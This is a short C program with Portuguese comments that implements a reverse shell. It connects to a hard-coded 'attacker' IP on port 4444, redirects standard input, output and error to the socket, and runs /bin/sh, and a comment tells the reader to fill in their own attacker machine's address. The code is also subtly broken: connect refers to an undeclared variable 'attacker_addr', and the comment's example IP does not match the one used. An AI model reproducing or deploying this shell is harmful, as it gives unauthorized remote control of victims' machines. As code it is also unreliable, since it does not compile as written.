#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int sock;
    struct sockaddr_in atacante;

    // 1. Criar socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Erro ao criar socket");
        exit(1);
    }

    // 2. Definir informações do atacante
    atacante.sin_family = AF_INET;
    atacante.sin_port = htons(4444); // Porta do atacante
    atacante.sin_addr.s_addr = inet_addr("192.168.100.5"); // IP do atacante
    // Aqui 192.168.0.100 é exemplo — você vai colocar o IP da máquina atacante

    // 3. Tentar conectar
    if (connect(sock, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) < 0) {
        perror("Erro ao conectar");
        exit(1);
    }

    // 4. Redirecionar STDIN, STDOUT e STDERR
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // 5. Executar shell
    execl("/bin/sh", "sh", NULL);

    return 0;
}
